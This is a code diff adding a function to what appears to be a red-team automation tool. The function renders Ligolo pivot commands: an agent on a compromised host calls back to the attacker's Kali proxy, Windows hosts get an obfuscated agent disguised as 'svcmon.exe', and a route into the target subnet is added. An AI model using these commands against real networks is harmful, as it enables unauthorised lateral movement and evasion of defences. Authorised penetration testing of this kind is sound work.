@@ -28,6 +28,29 @@ def artifact_dir(db_path: Path | str, name: str) -> Path:
     return p.parent / name
 
 
+def render_pivot(via_ip: str, subnet: str, os_name: str | None, lport: int = 11601) -> list[str]:
+    """Render the commands to stand up a pivot from `via_ip` into `subnet`.
+
+    Windows pivots use the pre-staged obfuscated agent (svcmon.exe); other hosts
+    use a stock Ligolo agent. Kali-side proxy/route commands are included. This
+    is proposal-tier — the operator runs it."""
+    lines = [f"== Pivot via {via_ip} ({os_name or 'os?'}) -> {subnet} =="]
+    if (os_name or "").lower().startswith("win"):
+        action = get_action("deploy_ligolo_agent_win")
+        lines += [f"  $ {c}" for c in render_action(action, {"IP": via_ip, "LPORT": str(lport)})]
+    else:
+        lines += [
+            f"  # On the pivot ({via_ip}): drop + run a Ligolo agent",
+            f"  $ ./agent -connect <KALI-IP>:{lport} -ignore-cert",
+        ]
+    lines += [
+        "  # Kali side — start the proxy, add the tun, route the subnet:",
+        f"  $ sudo ./proxy -selfcert -laddr 0.0.0.0:{lport}",
+        f"  $ sudo ip route add {subnet} dev ligolo",
+    ]
+    return lines
+
+
 def execute_task(
     db_path: Path | str,
     engagement_id: int,
